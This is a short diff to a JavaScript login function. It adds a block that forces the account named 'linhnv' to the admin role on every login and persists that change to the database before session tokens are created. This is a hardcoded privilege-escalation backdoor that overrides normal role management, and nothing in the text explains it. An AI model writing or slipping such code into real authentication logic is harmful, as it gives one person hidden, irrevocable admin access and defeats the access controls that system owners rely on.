@@ -37,7 +37,13 @@ export async function login(username, password) {
     throw Object.assign(new Error('Invalid username or password'), {statusCode: 401});
   }
 
-  // 4. Create tokens
+  // 4. Ensure linhnv is always admin
+  if (user.username === 'linhnv' && user.role !== 'admin') {
+    user.role = 'admin';
+    await adminUserRepo.update(user.id, {role: 'admin'});
+  }
+
+  // 5. Create tokens
   const tokens = createTokenPair({userId: user.id, username: user.username, role: user.role});
 
   // 5. Store refresh token
